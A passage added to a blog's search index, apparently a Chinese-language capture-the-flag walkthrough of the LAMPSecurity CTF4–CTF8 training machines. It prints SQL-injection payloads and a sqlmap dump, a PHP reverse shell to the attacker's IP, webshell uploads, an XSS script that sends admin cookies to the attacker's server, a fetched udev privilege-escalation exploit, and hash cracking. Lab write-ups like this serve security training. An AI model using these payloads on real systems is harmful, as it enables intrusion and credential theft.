@@ -5050,4 +5050,148 @@ flag为这些答案总和的md5（以<a href="https://cyberchef.org/%E7%BD%91%E7
         <category>折腾笔记</category>
       </categories>
   </entry>
+  <entry>
+    <title>LAMPSecurity:CTF全系列</title>
+    <url>/2026/03/18/LAMPSecurity_%20CTF%E5%85%A8%E7%B3%BB%E5%88%97/</url>
+    <content><![CDATA[<h1 id="LAMPSecurity-CTF4"><a href="#LAMPSecurity-CTF4" class="headerlink" title="LAMPSecurity: CTF4"></a>LAMPSecurity: CTF4</h1><p>将靶机设置为 NAT 模式，启动，我这里配置如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">攻击机ip：192.168.52.128<br>靶机ip：192.168.52.134<br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先使用 fscan 扫一下靶机，发现 22 端口和 80 端口开放</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./fscan -h 192.168.52.134 -nopoc<br><br>[1.6s]     已选择服务扫描模式<br>[1.6s]     开始信息扫描<br>[1.6s]     最终有效主机数量: 1<br>[1.6s]     开始主机扫描<br>[1.6s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle<br>[1.6s]     有效端口数量: 233<br>[1.6s] [*] 端口开放 192.168.52.134:80<br>[2.6s] [*] 端口开放 192.168.52.134:22<br>[4.6s]     扫描完成, 发现 2 个开放端口<br>[4.6s]     存活端口数量: 2<br>[4.6s]     开始漏洞扫描<br>[4.7s] [*] 网站标题 http://192.168.52.134     状态码:200 长度:3479   标题:Prof. Ehks<br></code></pre></td></tr></table></figure>
+
+<p>在 <code>首页-&gt;Blog</code> 页面有很多文章，点开一篇观察到 url 上出现了 id 参数，测试 SQL 注入，输入单引号报错，确定存在字符型注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://192.168.52.134/index.html?page=blog&amp;title=Blog&amp;id=1&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260318/L2Fl/2007X594/assets/image-20260203100831-3kzp53d.png" alt="image"></p>
+<p>用 sqlmap 跑一下，得到六个账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python .\sqlmap.py -u &quot;http://192.168.52.134/index.html?page=blog&amp;title=Blog&amp;id=1&quot; -D ehks -T user -C user_name,user_pass --dump<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260318/4lTn/1835X447/assets/image-20260203100957-a95c5a6.png" alt="image"></p>
+<p>得到账号密码后，猜测是 ssh 的账号密码，但是直接连接会有问题，使用如下命令强制连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \<br>    -oHostKeyAlgorithms=+ssh-rsa \<br>    -oUserKnownHostsFile=/dev/null \<br>    -oStrictHostKeyChecking=no \<br>    dstevens@192.168.52.134<br></code></pre></td></tr></table></figure>
+
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>ssh 连上靶机后，尝试提权，先检查下当前用户权限，发现权限较高</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[dstevens@ctf4 ~]$ sudo -l<br>Password:<br>User dstevens may run the following commands on this host:<br>    (ALL) ALL<br></code></pre></td></tr></table></figure>
+
+<p>我们可以直接以 root 权限启动一个新的 bash shell，成功提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[dstevens@ctf4 ~]$ sudo /bin/bash<br>[root@ctf4 ~]# id<br>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=user_u:system_r:unconfined_t<br></code></pre></td></tr></table></figure>
+
+<h1 id="LAMPSecurity-CTF5"><a href="#LAMPSecurity-CTF5" class="headerlink" title="LAMPSecurity: CTF5"></a>LAMPSecurity: CTF5</h1><p>将靶机设置为 NAT 模式，启动，我这里配置如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">攻击机ip：192.168.52.128<br>靶机ip：192.168.52.135<br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先使用 fscan 扫一下靶机，发现 22、80 和 3306 等端口开放</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./fscan -h 192.168.52.135 -nopoc<br><br>[2.2s]     已选择服务扫描模式<br>[2.2s]     开始信息扫描<br>[2.2s]     最终有效主机数量: 1<br>[2.2s]     开始主机扫描<br>[2.2s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle<br>[2.2s]     有效端口数量: 233<br>[2.3s] [*] 端口开放 192.168.52.135:80<br>[2.3s] [*] 端口开放 192.168.52.135:3306<br>[2.3s] [*] 端口开放 192.168.52.135:445<br>[2.3s] [*] 端口开放 192.168.52.135:143<br>[2.3s] [*] 端口开放 192.168.52.135:139<br>[2.3s] [*] 端口开放 192.168.52.135:110<br>[2.3s] [*] 端口开放 192.168.52.135:22<br>[3.3s]     扫描完成, 发现 7 个开放端口<br>[3.3s]     存活端口数量: 7<br>[3.3s]     开始漏洞扫描<br>[3.4s] [+] NetBios 192.168.52.135  192.168.52.135                      Unix<br>[3.5s]     系统信息 192.168.52.135 [Unix]<br>[3.5s] [*] 网站标题 http://192.168.52.135     状态码:200 长度:1538   标题:Phake Organization<br></code></pre></td></tr></table></figure>
+
+<p>先看下 80 端口的 web 服务，是一个博客网站，用的框架是 NanoCMS</p>
+<p>搜索发现该 CMS 存在信息泄露，在<code> /data/pagesdata.txt</code> 会泄露用户名和密码 hash</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260318/Jcr7/2016X485/assets/image-20260203102757-cnvude0.png" alt="image"></p>
+<p>CMD5查一下得到密码明文 shannon，有了账号密码，直接登陆进入管理员后台</p>
+<p>在后台界面的 <code>Pages &amp; Options</code> 中，编辑一下 Contact 页面的内容，添加一个反弹 shell 的木马，保存界面，然后访问 <code>http://192.168.52.135/~andy/index.php?page=contact</code> 即可成功反弹到 shell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.52.128/3344 0&gt;&amp;1&#x27;&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260318/JxMR/2014X790/assets/image-20260203103640-ilyvz0f.png" alt="image"></p>
+<h2 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升"></a>权限提升</h2><p>成功拿到 shell，尝试提权，发现 &#x2F;home 目录下有很多用户，使用查找命令查找 pass 字样，发现 Root password 字样的文件，访问该文件发现 root 密码  50$cent</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">grep -R -i pass /home/* 2&gt;/dev/null<br>/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note<br></code></pre></td></tr></table></figure>
+
+<p>得到密码后直接切换 root 用户输入密码，成功提权至 root</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">su root<br></code></pre></td></tr></table></figure>
+
+<h1 id="LAMPSecurity-CTF6"><a href="#LAMPSecurity-CTF6" class="headerlink" title="LAMPSecurity: CTF6"></a>LAMPSecurity: CTF6</h1><p>将靶机设置为 NAT 模式，启动，我这里配置如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">攻击机ip：192.168.52.128<br>靶机ip：192.168.52.136<br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先使用 fscan 扫一下靶机，发现 22、80 和 3306 等端口开放</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./fscan -h 192.168.52.136 -nopoc<br><br>[1.9s]     已选择服务扫描模式<br>[1.9s]     开始信息扫描<br>[1.9s]     最终有效主机数量: 1<br>[1.9s]     开始主机扫描<br>[1.9s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle<br>[1.9s]     有效端口数量: 233<br>[2.0s] [*] 端口开放 192.168.52.136:3306<br>[2.0s] [*] 端口开放 192.168.52.136:22<br>[2.0s] [*] 端口开放 192.168.52.136:80<br>[2.0s] [*] 端口开放 192.168.52.136:110<br>[2.0s] [*] 端口开放 192.168.52.136:995<br>[2.0s] [*] 端口开放 192.168.52.136:143<br>[2.0s] [*] 端口开放 192.168.52.136:443<br>[2.0s] [*] 端口开放 192.168.52.136:993<br>[2.0s]     扫描完成, 发现 8 个开放端口<br>[2.0s]     存活端口数量: 8<br>[2.0s]     开始漏洞扫描<br>[2.2s] [*] 网站标题 https://192.168.52.136    状态码:200 长度:5974   标题:CTF 6 - Widgets Inc.<br>[2.2s] [*] 网站标题 http://192.168.52.136     状态码:200 长度:5974   标题:CTF 6 - Widgets Inc.<br></code></pre></td></tr></table></figure>
+
+<p>先看下 80 端口的 web 服务，没发现什么能利用的东西，开始目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python .\dirsearch.py -u http://192.168.52.136/<br></code></pre></td></tr></table></figure>
+
+<p>扫到 sql 目录，访问发现一个 <code>db.sql</code> 文件，打开找到管理员账号密码 admin&#x2F;adminpass</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260318/8zmp/2006X777/assets/image-20260203110521-hy7ecvh.png" alt="image"></p>
+<p>成功登陆后台，点击 <code>Edit this event</code>，上传图像的地方上传一个反弹 shell 木马文件 <code>shell.php</code>，上传之后点击 <code>Home</code> 就能触发访问木马，靶机开启监听，成功反弹 shell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.52.128/3344 0&gt;&amp;1&#x27;&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="权限提升-2"><a href="#权限提升-2" class="headerlink" title="权限提升"></a>权限提升</h2><p>UDEV 提权，使用 <code>8478.sh</code> 脚本提权</p>
+<p>先把脚本复制到当前目录，再在攻击机上起一个 http 服务，方便靶机下载提权脚本，靶机下载后给脚本添加一个可执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cp /usr/share/exploitdb/exploits/linux/local/8478.sh ./<br>python -m http.server 8888<br><br>wget http://192.168.52.128:8888/8478.sh<br>chmod +x 8478.sh<br></code></pre></td></tr></table></figure>
+
+<p>然后获取一下 netlink 套接字的状态信息，选择 Groups 为 ffffffff 的进程，记住 PID，这里是 568，再用 sed 命令将文件中的 Windows 换行符（\r\n）转换为 Unix 换行符，最后执行脚本即可成功提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cat /proc/net/netlink<br>sed -i -e &#x27;s/\r$//&#x27; 8478.sh<br>./8478.sh 568<br></code></pre></td></tr></table></figure>
+
+<h1 id="LAMPSecurity-CTF7"><a href="#LAMPSecurity-CTF7" class="headerlink" title="LAMPSecurity: CTF7"></a>LAMPSecurity: CTF7</h1><p>将靶机设置为 NAT 模式，启动，我这里配置如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">攻击机ip：192.168.52.128<br>靶机ip：192.168.52.137<br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先使用 fscan 扫一下靶机，发现 22、80、8080 和 10000 等端口开放</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./fscan -h 192.168.52.137 -nopoc<br><br>[2.2s]     已选择服务扫描模式<br>[2.2s]     开始信息扫描<br>[2.2s]     最终有效主机数量: 1<br>[2.2s]     开始主机扫描<br>[2.2s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle<br>[2.2s]     有效端口数量: 233<br>[2.2s] [*] 端口开放 192.168.52.137:80<br>[2.2s] [*] 端口开放 192.168.52.137:139<br>[2.2s] [*] 端口开放 192.168.52.137:22<br>[2.2s] [*] 端口开放 192.168.52.137:10000<br>[2.2s] [*] 端口开放 192.168.52.137:8080<br>[5.2s]     扫描完成, 发现 5 个开放端口<br>[5.2s]     存活端口数量: 5<br>[5.2s]     开始漏洞扫描<br>[5.2s] [*] 网站标题 http://192.168.52.137     状态码:200 长度:6058   标题:Mad Irish Hacking Academy<br>[5.3s] [+] NetBios 192.168.52.137  192.168.52.137                      Unix<br>[5.9s] [*] 网站标题 http://192.168.52.137:10000 状态码:200 长度:2544   标题:Login to Webmin<br></code></pre></td></tr></table></figure>
+
+<p>有三个 http 服务端口，依次查看：</p>
+<p>80 端口没发现什么东西，尝试目录扫描，扫到一个 <code>/assets/</code> 目录，用来存放图片文件的</p>
+<p>8080 端口开放的是一个登陆页面，尝试万能密码成功登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">账号：1&#x27; or 1=1#<br>密码：1&#x27; or 1=1#<br></code></pre></td></tr></table></figure>
+
+<p>登陆后台后，在 <code>Manage Offerings-&gt;Reading Room-&gt;Add new</code> 这里可以上传图片，直接上传一个反弹 shell 的木马文件，成功上传了，在 80 端口的 <code>/assets/</code> 目录里发现上传的木马</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260318/Cw04/2001X738/assets/image-20260203145737-v0x2cpk.png" alt="image"></p>
+<p>靶机开启监听，然后访问木马文件，成功拿到 shell</p>
+<h2 id="权限提升-3"><a href="#权限提升-3" class="headerlink" title="权限提升"></a>权限提升</h2><p>尝试进行提权，主流方法都不行，查看 web 源码里的数据库配置文件，发现 root 用户的密码配置为空，于是直接 mysql 进入数据库中找线索</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>cat /var/www/admin/inc/db.php<br><br>mysql -u root -p<br></code></pre></td></tr></table></figure>
+
+<p>在 website 数据库的 users 表中找到一堆账号和密码 hash</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260318/yyLP/2407X481/assets/image-20260203150538-1n9i426.png" alt="image"></p>
+<p>一看就知道第一个用户不简单，is_admin 的值也是 1，先用 CMD5 查到密码明文是 my2cents，再强制 ssh 连接，输入密码即可成功登陆 brian 用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \<br>    -oHostKeyAlgorithms=+ssh-rsa \<br>    -oUserKnownHostsFile=/dev/null \<br>    -oStrictHostKeyChecking=no \<br>    brian@192.168.52.137<br></code></pre></td></tr></table></figure>
+
+<p>sudo -l 命令检查下当前用户权限，发现权限较高，直接以 root 权限启动一个新的 bash shell，成功提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[brian@192 ~]$ sudo /bin/bash<br>[root@192 brian]# id<br>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023<br></code></pre></td></tr></table></figure>
+
+<h1 id="LAMPSecurity-CTF8"><a href="#LAMPSecurity-CTF8" class="headerlink" title="LAMPSecurity: CTF8"></a>LAMPSecurity: CTF8</h1><p>将靶机设置为 NAT 模式，启动，我这里配置如下（不知道为什么，跟上一个靶机 IP 一样）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">攻击机ip：192.168.52.128<br>靶机ip：192.168.52.137<br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先使用 fscan 扫一下靶机，发现 21、22、80、110 和 3306 等端口开放</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./fscan -h 192.168.52.137 -nopoc<br><br>[2.1s]     已选择服务扫描模式<br>[2.1s]     开始信息扫描<br>[2.1s]     最终有效主机数量: 1<br>[2.1s]     开始主机扫描<br>[2.1s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle<br>[2.1s]     有效端口数量: 233<br>[2.1s] [*] 端口开放 192.168.52.137:22<br>[2.1s] [*] 端口开放 192.168.52.137:80<br>[2.1s] [*] 端口开放 192.168.52.137:110<br>[2.1s] [*] 端口开放 192.168.52.137:21<br>[2.2s] [*] 端口开放 192.168.52.137:143<br>[2.2s] [*] 端口开放 192.168.52.137:139<br>[2.2s] [*] 端口开放 192.168.52.137:445<br>[2.2s] [*] 端口开放 192.168.52.137:443<br>[2.2s] [*] 端口开放 192.168.52.137:993<br>[2.2s] [*] 端口开放 192.168.52.137:995<br>[2.2s] [*] 端口开放 192.168.52.137:3306<br>[2.2s]     扫描完成, 发现 11 个开放端口<br>[2.2s]     存活端口数量: 11<br>[2.2s]     开始漏洞扫描<br>[2.6s] [+] FTP服务 192.168.52.137:21 匿名登录成功!<br>[2.9s]     系统信息 192.168.52.137 [Unix]<br>[2.9s] [+] NetBios 192.168.52.137  192.168.52.137                      Unix<br>[3.5s] [*] 网站标题 https://192.168.52.137    状态码:200 长度:7957   标题:LAMPSecurity Research<br>[3.5s] [*] 网站标题 http://192.168.52.137     状态码:200 长度:7956   标题:LAMPSecurity Research<br></code></pre></td></tr></table></figure>
+
+<p>首先访问 80 端口的 web 服务，查看源码发现第一个 flag</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260318/k17I/2013X747/assets/image-20260203161705-cp0iunu.png" alt="image"></p>
+<p>目录扫描发现很多泄露的文件和目录，有些文件里有 flag，这里就先不管这些 flag 了，以拿 shell 为目标</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python .\dirsearch.py -u http://192.168.52.137/ -i 200<br></code></pre></td></tr></table></figure>
+
+<p>还是一个博客系统，主页先随便注册一个用户 test，登陆，找一篇文章发送评论，测试 xss</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(/xss/)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260318/5zGj/2008X807/assets/image-20260203173414-7sw03rc.png" alt="image"></p>
+<p>证明了 xss 漏洞存在，我们需要利用 xss 漏洞获取管理员的 cookie 从而拿到管理员权限</p>
+<p>首先攻击机 kali 开启一个 http 服务监听 cookie 信息，将如下 payload 通过评论发送给作者，然后对帖子的作者进行留言这样他就会看你的评论，从而触发 xss 漏洞获取到 cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">python -m http.server<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;<br>    var request = new XMLHttpRequest();<br>    var redirect_url = &quot;http://192.168.52.128:8000/&quot; + document.cookie;<br>    request.open(&quot;GET&quot;, redirect_url);<br>    request.send();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>提交完邮件等待几分钟就能看到除我们自己外还拿到了两个 cookie</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260318/mW5S/1630X746/assets/image-20260203182019-7idin5d.png" alt="image"></p>
+<p>使用上图中倒数第二个 cookie 即可成功伪造 Barbara 身份</p>
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260318/udCW/1994X552/assets/image-20260203182123-kmxy1fi.png" alt="image"></p>
+<p>在 Barbara 用户的主页，<code>Create content-&gt;Page</code> 添加文章，Input format 选择 PHP code，其他选项默认即可，写入如下脚本查询数据库中的用户名和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>$result = db_query(&#x27;SELECT name, pass FROM users&#x27;);<br>while ($test = db_fetch_object($result)) &#123;<br>    print $test-&gt;name . &quot; : &quot; . $test-&gt;pass . &quot;&lt;br/&gt;&quot;;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>创建即可得到数据库中所有的账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">admin : 49265c16d1dff8acef3499bd889299d6<br>Barbara : bed128365216c019988915ed3add75fb<br>Jim : 2a5de0f53b1317f7e36afcdb6b5202a4<br>Steve : 08d15a4aef553492d8971cdd5198f314<br>Sherry : c3319d1016a802db86653bcfab871f4f<br>Gene : 9b9e4bbd988954028a44710a50982576<br>Harvey : 7d29975b78825ea7c27f5c0281ea2fa4<br>John : 518462cd3292a67c755521c1fb50c909<br>Johnathan : 6dc523ebd2379d96cc0af32e2d224db0<br>Susan : 0d42223010b69cab86634bc359ed870b<br>Dan : 8f75ad3f04fc42f07c95e2f3d0ec3503<br>George : ed2b1f468c5f915f3f1cf75d7068baae<br>Jeff : ca594f739e257245f2be69eb546c1c04<br>Stacey : 85aca385eb555fb6a36a62915ddd8bc7<br>Juan : 573152cc51de19df50e90b0e557db7fe<br>Michael : c7a4476fc64b75ead800da9ea2b7d072<br>Jerome : 42248d4cb640a3fb5836571e254aee2b<br>Tom : 971dcf53e88e9268714d9d504753d347<br>Xavier : 3005d829eb819341357bfddf541c175b<br>Sally : 7a1c07ff60f9c07ffe8da34ecbf4edc2<br>test : 098f6bcd4621d373cade4e832627b4f6<br></code></pre></td></tr></table></figure>
+
+<p>将这些去除空格保存到 <code>users.txt</code> 里，使用 john 爆破得到明文密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">john -w=/usr/share/wordlists/rockyou.txt -form=raw-md5 users.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260318/gmaV/1629X658/assets/image-20260203183626-zqw2bwm.png" alt="image"></p>
+<p>爆破得到的用户名只是单纯的昵称，所以我们需要在 <code>User management-&gt;Users</code> 里依次查看使用这些昵称的用户的邮箱地址，这才是真正的用户名</p>
+<p>使用 Barbara 用户对应的用户名 bdio 和对应的密码 passw0rd 登陆 ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \<br>    -oHostKeyAlgorithms=+ssh-rsa \<br>    -oUserKnownHostsFile=/dev/null \<br>    -oStrictHostKeyChecking=no \<br>    bdio@192.168.52.137<br></code></pre></td></tr></table></figure>
+
+<h2 id="权限提升-4"><a href="#权限提升-4" class="headerlink" title="权限提升"></a>权限提升</h2><p>成功登陆 ssh，但是该用户无法提权，继续尝试刚刚爆破出来的那些账号密码，最后发现 spinkton&#x2F;football123 也可以成功登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">su spinkton<br></code></pre></td></tr></table></figure>
+
+<p>并且 使用 sudo -l 命令检查发现当前用户权限较高，直接以 root 权限启动一个新的 bash shell，成功提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[spinkton@192 bdio]$ sudo -l<br>Password: football12 <br>User spinkton may run the following commands on this host:<br>    (ALL) ALL<br>[spinkton@192 bdio]$ sudo /bin/bash<br>[root@192 bdio]# id<br>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=user_u:system_r:unconfined_t<br></code></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>靶场通关</category>
+      </categories>
+      <tags>
+        <tag>靶场通关</tag>
+      </tags>
+  </entry>
 </search>
